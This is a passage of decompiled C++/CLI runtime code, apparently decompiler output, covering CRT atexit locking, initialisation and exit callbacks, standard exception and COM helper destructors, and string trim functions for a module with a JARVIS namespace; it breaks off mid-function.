  internal static unsafe allocator\u003Cchar\u003E* std\u002Eallocator\u003Cchar\u003E\u002E\u007Bctor\u007D(
    [In] allocator\u003Cchar\u003E* obj0,
    allocator\u003Cchar\u003E* _param1)
  {
    return obj0;
  }

  [SpecialName]
  internal static unsafe bad_alloc* std\u002Ebad_alloc\u002E\u007Bctor\u007D(
    [In] bad_alloc* obj0,
    bad_alloc* _param1)
  {
    \u003CModule\u003E.std\u002Eexception\u002E\u007Bctor\u007D((exception*) obj0, (exception*) _param1);
    // ISSUE: fault handler
    try
    {
      *(int*) obj0 = (int) &\u003CModule\u003E.\u003F\u003F_7bad_alloc\u0040std\u0040\u00406B\u0040;
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Eexception\u002E\u007Bdtor\u007D), (void*) obj0);
    }
    return obj0;
  }

  [DebuggerStepThrough]
  internal static unsafe ValueType \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_handle() => (IntPtr) \u003CModule\u003E.\u003F_lock\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0PAXA != IntPtr.Zero ? (ValueType) GCHandle.FromIntPtr(new IntPtr(\u003CModule\u003E.\u003F_lock\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0PAXA)) : (ValueType) null;

  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Set(
    object value)
  {
    ValueType valueType = \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_handle();
    if (valueType == null)
      \u003CModule\u003E.\u003F_lock\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0PAXA = GCHandle.ToIntPtr(GCHandle.Alloc(value)).ToPointer();
    else
      ((GCHandle) valueType).Target = value;
  }

  [DebuggerStepThrough]
  internal static object \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Get()
  {
    ValueType valueType = \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_handle();
    return valueType != null ? ((GCHandle) valueType).Target : (object) null;
  }

  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Destruct()
  {
    ValueType valueType = \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_handle();
    if (valueType == null)
      return;
    ((GCHandle) valueType).Free();
    \u003CModule\u003E.\u003F_lock\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0PAXA = (void*) 0;
  }

  [DebuggerStepThrough]
  [return: MarshalAs(UnmanagedType.U1)]
  internal static bool \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EIsInitialized() => \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Get() != null;

  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EAddRef()
  {
    if (!\u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EIsInitialized())
    {
      object obj = new object();
      \u003CModule\u003E.\u003F_lock\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0PAXA = (void*) 0;
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Set(obj);
      \u003CModule\u003E.\u003F_ref_count\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0HA = 0;
    }
    ++\u003CModule\u003E.\u003F_ref_count\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0HA;
  }

  [DebuggerStepThrough]
  [return: MarshalAs(UnmanagedType.U1)]
  internal static bool \u003FA0x11773762\u002E__alloc_global_lock()
  {
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EAddRef();
    return \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EIsInitialized();
  }

  [DebuggerStepThrough]
  internal static void \u003FA0x11773762\u002E__dealloc_global_lock()
  {
    --\u003CModule\u003E.\u003F_ref_count\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0HA;
    if (\u003CModule\u003E.\u003F_ref_count\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0HA != 0)
      return;
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Destruct();
  }

  internal static unsafe void _exit_callback()
  {
    if (\u003CModule\u003E.\u003FA0x11773762\u002E__exit_list_size == 0U)
      return;
    __FnPtr<void ()>* local1 = (__FnPtr<void ()>*) \u003CModule\u003E._decode_pointer((void*) \u003CModule\u003E.\u003FA0x11773762\u002E__onexitbegin_m);
    __FnPtr<void ()>* local2 = (__FnPtr<void ()>*) \u003CModule\u003E._decode_pointer((void*) \u003CModule\u003E.\u003FA0x11773762\u002E__onexitend_m);
    if ((IntPtr) local1 != new IntPtr(-1) && (IntPtr) local1 != IntPtr.Zero && (IntPtr) local2 != IntPtr.Zero)
    {
      __FnPtr<void ()>* local3 = local1;
      __FnPtr<void ()>* local4 = local2;
      while (true)
      {
        __FnPtr<void ()>* local5;
        __FnPtr<void ()>* local6;
        do
        {
          do
          {
            local2 -= 4;
            if (local2 < local1)
              goto label_7;
          }
          while ((IntPtr) *(int*) local2 == (IntPtr) \u003CModule\u003E._encoded_null());
          void* voidPtr = \u003CModule\u003E._decode_pointer((void*) *(int*) local2);
          *(int*) local2 = (int) \u003CModule\u003E._encoded_null();
          // ISSUE: cast to a function pointer type
          // ISSUE: function pointer call
          __calli((__FnPtr<void ()>) (IntPtr) voidPtr)();
          local5 = (__FnPtr<void ()>*) \u003CModule\u003E._decode_pointer((void*) \u003CModule\u003E.\u003FA0x11773762\u002E__onexitbegin_m);
          local6 = (__FnPtr<void ()>*) \u003CModule\u003E._decode_pointer((void*) \u003CModule\u003E.\u003FA0x11773762\u002E__onexitend_m);
        }
        while (local3 == local5 && local4 == local6);
        local3 = local5;
        local1 = local5;
        local4 = local6;
        local2 = local6;
      }
label_7:
      Marshal.FreeHGlobal(new IntPtr((void*) local1));
    }
    \u003CModule\u003E.\u003FA0x11773762\u002E__dealloc_global_lock();
  }

  [DebuggerStepThrough]
  internal static unsafe int _initatexit_m()
  {
    if (!\u003CModule\u003E.\u003FA0x11773762\u002E__alloc_global_lock())
      return 0;
    \u003CModule\u003E.\u003FA0x11773762\u002E__onexitbegin_m = (__FnPtr<void ()>*) \u003CModule\u003E._encode_pointer(Marshal.AllocHGlobal(128).ToPointer());
    \u003CModule\u003E.\u003FA0x11773762\u002E__onexitend_m = \u003CModule\u003E.\u003FA0x11773762\u002E__onexitbegin_m;
    \u003CModule\u003E.\u003FA0x11773762\u002E__exit_list_size = 32U;
    return 1;
  }

  [DebuggerStepThrough]
  internal static unsafe int _initatexit_app_domain()
  {
    if (\u003CModule\u003E.\u003FA0x11773762\u002E__alloc_global_lock())
    {
      \u003CModule\u003E.__onexitbegin_app_domain = (__FnPtr<void ()>*) \u003CModule\u003E._encode_pointer(Marshal.AllocHGlobal(128).ToPointer());
      \u003CModule\u003E.__onexitend_app_domain = \u003CModule\u003E.__onexitbegin_app_domain;
      \u003CModule\u003E.__exit_list_size_app_domain = 32U;
    }
    return 1;
  }

  internal static unsafe void _app_exit_callback()
  {
    if (\u003CModule\u003E.__exit_list_size_app_domain == 0U)
      return;
    __FnPtr<void ()>* local1 = (__FnPtr<void ()>*) \u003CModule\u003E._decode_pointer((void*) \u003CModule\u003E.__onexitbegin_app_domain);
    __FnPtr<void ()>* local2 = (__FnPtr<void ()>*) \u003CModule\u003E._decode_pointer((void*) \u003CModule\u003E.__onexitend_app_domain);
    try
    {
      if ((IntPtr) local1 == new IntPtr(-1) || (IntPtr) local1 == IntPtr.Zero || (IntPtr) local2 == IntPtr.Zero)
        return;
      __FnPtr<void ()>* local3 = local1;
      __FnPtr<void ()>* local4 = local2;
      while (true)
      {
        __FnPtr<void ()>* local5;
        __FnPtr<void ()>* local6;
        do
        {
          do
          {
            local2 -= 4;
          }
          while (local2 >= local1 && (IntPtr) *(int*) local2 == (IntPtr) \u003CModule\u003E._encoded_null());
          if (local2 >= local1)
          {
            // ISSUE: cast to a function pointer type
            __FnPtr<void ()> local7 = (__FnPtr<void ()>) (IntPtr) \u003CModule\u003E._decode_pointer((void*) *(int*) local2);
            *(int*) local2 = (int) \u003CModule\u003E._encoded_null();
            // ISSUE: function pointer call
            __calli(local7)();
            local5 = (__FnPtr<void ()>*) \u003CModule\u003E._decode_pointer((void*) \u003CModule\u003E.__onexitbegin_app_domain);
            local6 = (__FnPtr<void ()>*) \u003CModule\u003E._decode_pointer((void*) \u003CModule\u003E.__onexitend_app_domain);
          }
          else
            goto label_12;
        }
        while (local3 == local5 && local4 == local6);
        local3 = local5;
        local1 = local5;
        local4 = local6;
        local2 = local6;
      }
label_12:;
    }
    finally
    {
      Marshal.FreeHGlobal(new IntPtr((void*) local1));
      \u003CModule\u003E.\u003FA0x11773762\u002E__dealloc_global_lock();
    }
  }

  [DebuggerStepThrough]
  internal static unsafe int _initterm_e(__FnPtr<int ()>* pfbegin, __FnPtr<int ()>* pfend)
  {
    int num1 = 0;
    if (pfbegin < pfend)
    {
      while (num1 == 0)
      {
        uint num2 = (uint) *(int*) pfbegin;
        if (num2 != 0U)
        {
          // ISSUE: cast to a function pointer type
          // ISSUE: function pointer call
          num1 = __calli((__FnPtr<int ()>) (int) num2)();
        }
        pfbegin += 4;
        if (pfbegin >= pfend)
          break;
      }
    }
    return num1;
  }

  [DebuggerStepThrough]
  internal static unsafe void _initterm(__FnPtr<void ()>* pfbegin, __FnPtr<void ()>* pfend)
  {
    if (pfbegin >= pfend)
      return;
    do
    {
      uint num = (uint) *(int*) pfbegin;
      if (num != 0U)
      {
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        __calli((__FnPtr<void ()>) (int) num)();
      }
      pfbegin += 4;
    }
    while (pfbegin < pfend);
  }

  [DebuggerStepThrough]
  internal static ModuleHandle \u003CCrtImplementationDetails\u003E\u002EThisModule\u002EHandle() => typeof (ThisModule).Module.ModuleHandle;

  [DebuggerStepThrough]
  internal static unsafe void _initterm_m(__FnPtr<void* ()>* pfbegin, __FnPtr<void* ()>* pfend)
  {
    if (pfbegin >= pfend)
      return;
    do
    {
      uint methodToken = (uint) *(int*) pfbegin;
      if (methodToken != 0U)
      {
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        void* voidPtr = __calli(\u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EThisModule\u002EResolveMethod\u003Cvoid\u0020const\u0020\u002A\u0020__clrcall\u0028void\u0029\u003E((__FnPtr<void* ()>) (int) methodToken))();
      }
      pfbegin += 4;
    }
    while (pfbegin < pfend);
  }

  [DebuggerStepThrough]
  internal static unsafe __FnPtr<void* ()> \u003CCrtImplementationDetails\u003E\u002EThisModule\u002EResolveMethod\u003Cvoid\u0020const\u0020\u002A\u0020__clrcall\u0028void\u0029\u003E(
    __FnPtr<void* ()> methodToken)
  {
    // ISSUE: cast to a function pointer type
    return (__FnPtr<void* ()>) (IntPtr) \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EThisModule\u002EHandle().ResolveMethodHandle((int) methodToken).GetFunctionPointer().ToPointer();
  }

  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  internal static unsafe void ___CxxCallUnwindDtor(__FnPtr<void (void*)> pDtor, void* pThis)
  {
    try
    {
      void* voidPtr = pThis;
      // ISSUE: function pointer call
      __calli(pDtor)(voidPtr);
    }
    catch (Exception ex) when (\u003CModule\u003E.__FrameUnwindFilter((_EXCEPTION_POINTERS*) Marshal.GetExceptionPointers()) != 0)
    {
    }
  }

  internal static unsafe void delete(void* _param0, void* _param1)
  {
  }

  internal static unsafe void std\u002Elength_error\u002E\u007Bdtor\u007D([In] length_error* obj0)
  {
    *(int*) obj0 = (int) &\u003CModule\u003E.\u003F\u003F_7length_error\u0040std\u0040\u00406B\u0040;
    *(int*) obj0 = (int) &\u003CModule\u003E.\u003F\u003F_7logic_error\u0040std\u0040\u00406B\u0040;
    // ISSUE: fault handler
    try
    {
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D((basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E*) ((IntPtr) obj0 + 12));
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Eexception\u002E\u007Bdtor\u007D), (void*) obj0);
    }
    \u003CModule\u003E.std\u002Eexception\u002E\u007Bdtor\u007D((exception*) obj0);
  }

  internal static unsafe void* std\u002Elength_error\u002E__vecDelDtor(
    [In] length_error* obj0,
    uint _param1)
  {
    if (((int) _param1 & 2) != 0)
    {
      length_error* lengthErrorPtr = (length_error*) ((IntPtr) obj0 - 4);
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.__ehvec_dtor((void*) obj0, 40U, *(int*) lengthErrorPtr, (__FnPtr<void (void*)>) __methodptr(std\u002Elength_error\u002E\u007Bdtor\u007D));
      if (((int) _param1 & 1) != 0)
        \u003CModule\u003E.delete\u005B\u005D((void*) lengthErrorPtr);
      return (void*) lengthErrorPtr;
    }
    *(int*) obj0 = (int) &\u003CModule\u003E.\u003F\u003F_7length_error\u0040std\u0040\u00406B\u0040;
    *(int*) obj0 = (int) &\u003CModule\u003E.\u003F\u003F_7logic_error\u0040std\u0040\u00406B\u0040;
    // ISSUE: fault handler
    try
    {
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D((basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E*) ((IntPtr) obj0 + 12));
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Eexception\u002E\u007Bdtor\u007D), (void*) obj0);
    }
    \u003CModule\u003E.std\u002Eexception\u002E\u007Bdtor\u007D((exception*) obj0);
    if (((int) _param1 & 1) != 0)
      \u003CModule\u003E.delete((void*) obj0);
    return (void*) obj0;
  }

  internal static unsafe long \u003FA0xQwpMpcjz\u002Etime(long* _Time) => \u003CModule\u003E._time64(_Time);

  internal static unsafe void _bstr_t\u002E\u007Bdtor\u007D([In] _bstr_t* obj0)
  {
    uint num1 = (uint) *(int*) obj0;
    if (num1 == 0U)
      return;
    int num2 = (int) \u003CModule\u003E._bstr_t\u002EData_t\u002ERelease((_bstr_t.Data_t*) num1);
    *(int*) obj0 = 0;
  }

  internal static unsafe uint _bstr_t\u002EData_t\u002ERelease([In] _bstr_t.Data_t* obj0)
  {
    uint num1 = (uint) \u003CModule\u003E.InterlockedDecrement((int*) ((IntPtr) obj0 + 8));
    if (num1 == 0U && (IntPtr) obj0 != IntPtr.Zero)
    {
      uint num2 = (uint) *(int*) obj0;
      if (num2 != 0U)
        \u003CModule\u003E.SysFreeString((char*) num2);
      uint num3 = (uint) *(int*) ((IntPtr) obj0 + 4);
      if (num3 != 0U)
        \u003CModule\u003E.delete\u005B\u005D((void*) num3);
      \u003CModule\u003E.delete((void*) obj0);
    }
    return num1;
  }

  internal static unsafe void* _com_error\u002E__vecDelDtor([In] _com_error* obj0, uint _param1)
  {
    if (((int) _param1 & 2) != 0)
    {
      _com_error* comErrorPtr = (_com_error*) ((IntPtr) obj0 - 4);
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.__ehvec_dtor((void*) obj0, 16U, *(int*) comErrorPtr, (__FnPtr<void (void*)>) __methodptr(_com_error\u002E\u007Bdtor\u007D));
      if (((int) _param1 & 1) != 0)
        \u003CModule\u003E.delete\u005B\u005D((void*) comErrorPtr);
      return (void*) comErrorPtr;
    }
    *(int*) obj0 = (int) &\u003CModule\u003E.\u003F\u003F_7_com_error\u0040\u00406B\u0040;
    uint num1 = (uint) *(int*) ((IntPtr) obj0 + 8);
    if (num1 != 0U)
    {
      int num2 = (int) num1;
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      int num3 = (int) __calli((__FnPtr<uint (IntPtr)>) *(int*) (*(int*) num2 + 8))((IntPtr) num2);
    }
    if (*(int*) ((IntPtr) obj0 + 12) != 0)
    {
      void* processHeap = \u003CModule\u003E.GetProcessHeap();
      if ((IntPtr) processHeap != IntPtr.Zero)
        \u003CModule\u003E.HeapFree(processHeap, 0U, (void*) *(int*) ((IntPtr) obj0 + 12));
    }
    if (((int) _param1 & 1) != 0)
      \u003CModule\u003E.delete((void*) obj0);
    return (void*) obj0;
  }

  internal static unsafe void _com_error\u002E\u007Bdtor\u007D([In] _com_error* obj0)
  {
    *(int*) obj0 = (int) &\u003CModule\u003E.\u003F\u003F_7_com_error\u0040\u00406B\u0040;
    uint num1 = (uint) *(int*) ((IntPtr) obj0 + 8);
    if (num1 != 0U)
    {
      int num2 = (int) num1;
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      int num3 = (int) __calli((__FnPtr<uint (IntPtr)>) *(int*) (*(int*) num2 + 8))((IntPtr) num2);
    }
    if (*(int*) ((IntPtr) obj0 + 12) == 0)
      return;
    void* processHeap = \u003CModule\u003E.GetProcessHeap();
    if ((IntPtr) processHeap == IntPtr.Zero)
      return;
    \u003CModule\u003E.HeapFree(processHeap, 0U, (void*) *(int*) ((IntPtr) obj0 + 12));
  }

  internal static unsafe void \u003FA0xwQwUFGeR\u002Eltrim(
    basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* s)
  {
    pointer_to_unary_function\u003Cint\u002Cint\u002Cint\u0020\u0028__cdecl\u002A\u0029\u0028int\u0029\u003E intIntIntCdeclInt1;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ref intIntIntCdeclInt1 = (int) \u003CModule\u003E.__unep\u0040\u003Fisspace\u0040\u0040\u0024\u0024J0YAHH\u0040Z;
    _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar1;
    _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar2 = *\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Eend(s, &stdAllocatorChar1);
    _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar3;
    _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar4 = *\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ebegin(s, &stdAllocatorChar3);
    unary_negate\u003Cstd\u003A\u003Apointer_to_unary_function\u003Cint\u002Cint\u002Cint\u0020\u0028__cdecl\u002A\u0029\u0028int\u0029\u003E\u0020\u003E intIntIntCdeclInt2 = (unary_negate\u003Cstd\u003A\u003Apointer_to_unary_function\u003Cint\u002Cint\u002Cint\u0020\u0028__cdecl\u002A\u0029\u0028int\u0029\u003E\u0020\u003E) intIntIntCdeclInt1;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    sbyte* numPtr = (sbyte*) ^(int&) ((IntPtr) &stdAllocatorChar4 + 4);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if (^(int&) ((IntPtr) &stdAllocatorChar4 + 4) != ^(int&) ((IntPtr) &stdAllocatorChar2 + 4))
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      do
      {
        int num = (int) *numPtr;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        if (__calli((__FnPtr<int (int)>) ^(int&) ref intIntIntCdeclInt2)(num) != 0)
          ++numPtr;
        else
          break;
      }
      while ((IntPtr) numPtr != (IntPtr) ^(int&) ((IntPtr) &stdAllocatorChar2 + 4));
    }
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &stdAllocatorChar4 + 4) = (int) numPtr;
    _String_const_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar5 = (_String_const_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E) stdAllocatorChar4;
    _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar6;
    _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr = \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ebegin(s, &stdAllocatorChar6);
    _String_const_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar7;
    // ISSUE: cpblk instruction
    __memcpy(ref stdAllocatorChar7, (IntPtr) stdAllocatorCharPtr, 8);
    _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar8;
    \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Eerase(s, &stdAllocatorChar8, stdAllocatorChar7, stdAllocatorChar5);
  }

  internal static unsafe void \u003FA0xWNzrvTQL\u002Ertrim(
    basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* s)
  {
    _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar1;
    _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr = \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Eend(s, &stdAllocatorChar1);
    _String_const_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar2;
    // ISSUE: cpblk instruction
    __memcpy(ref stdAllocatorChar2, (IntPtr) stdAllocatorCharPtr, 8);
    unary_negate\u003Cstd\u003A\u003Apointer_to_unary_function\u003Cint\u002Cint\u002Cint\u0020\u0028__cdecl\u002A\u0029\u0028int\u0029\u003E\u0020\u003E _Pred;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ref _Pred = (int) \u003CModule\u003E.__unep\u0040\u003Fisspace\u0040\u0040\u0024\u0024J0YAHH\u0040Z;
    reverse_iterator\u003Cstd\u003A\u003A_String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u0020\u003E stdAllocatorChar3;
    reverse_iterator\u003Cstd\u003A\u003A_String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u0020\u003E stdAllocatorChar4 = *\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Erend(s, &stdAllocatorChar3);
    reverse_iterator\u003Cstd\u003A\u003A_String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u0020\u003E stdAllocatorChar5;
    reverse_iterator\u003Cstd\u003A\u003A_String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u0020\u003E stdAllocatorChar6 = *\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Erbegin(s, &stdAllocatorChar5);
    reverse_iterator\u003Cchar\u0020\u002A\u003E _Last;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ref _Last = ^(int&) ((IntPtr) &stdAllocatorChar4 + 4);
    reverse_iterator\u003Cchar\u0020\u002A\u003E _First;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ref _First = ^(int&) ((IntPtr) &stdAllocatorChar6 + 4);
    reverse_iterator\u003Cchar\u0020\u002A\u003E reverseIteratorChar1;
    reverse_iterator\u003Cchar\u0020\u002A\u003E reverseIteratorChar2 = *\u003CModule\u003E.std\u002E_Find_if\u003Cclass\u0020std\u003A\u003Areverse_iterator\u003Cchar\u0020\u002A\u003E\u002Cclass\u0020std\u003A\u003Aunary_negate\u003Cclass\u0020std\u003A\u003Apointer_to_unary_function\u003Cint\u002Cint\u002Cint\u0020\u0028__cdecl\u002A\u0029\u0028int\u0029\u003E\u0020\u003E\u0020\u003E(&reverseIteratorChar1, _First, _Last, _Pred);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &stdAllocatorChar6 + 4) = ^(int&) ref reverseIteratorChar2;
    _String_const_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar7 = (_String_const_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E) stdAllocatorChar6;
    _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar8;
    \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Eerase(s, &stdAllocatorChar8, stdAllocatorChar7, stdAllocatorChar2);
  }

  internal static unsafe void \u003FA0xAPusFTJv\u002Etrim(
    basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* s)
  {
    \u003CModule\u003E.\u003FA0xwQwUFGeR\u002Eltrim(s);
    \u003CModule\u003E.\u003FA0xWNzrvTQL\u002Ertrim(s);
  }

  internal static unsafe sbyte* JARVIS\u002ERuntimeException\u002Ewhat([In] RuntimeException* obj0) => (sbyte*) *(int*) ((IntPtr) obj0 + 12);

  internal static unsafe void* JARVIS\u002ERuntimeException\u002E__vecDelDtor(
    [In] RuntimeException* obj0,
    uint _param1)
  {
    if (((int) _param1 & 2) != 0)
    {
      RuntimeException* runtimeExceptionPtr = (RuntimeException*) ((IntPtr) obj0 - 4);
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
